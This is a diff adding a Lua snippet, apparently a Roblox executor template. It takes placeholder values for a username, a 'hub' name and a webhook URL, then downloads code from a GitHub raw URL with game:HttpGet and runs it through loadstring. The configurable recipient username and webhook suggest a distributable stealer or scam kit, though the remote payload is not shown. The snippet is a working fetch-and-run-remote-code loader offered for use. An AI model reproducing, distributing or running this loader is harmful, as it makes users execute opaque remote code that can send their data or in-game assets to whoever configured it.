@@ -1,0 +1,9 @@
+```lua
+
+_G.Username = "YOUR ROBLOX USERNAME HERE"
+
+_G.HubName = "YOUR SCRIPT NAME HERE"
+
+_G.WebhookUrl = "YOUR WEBHOOK HERE"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()```
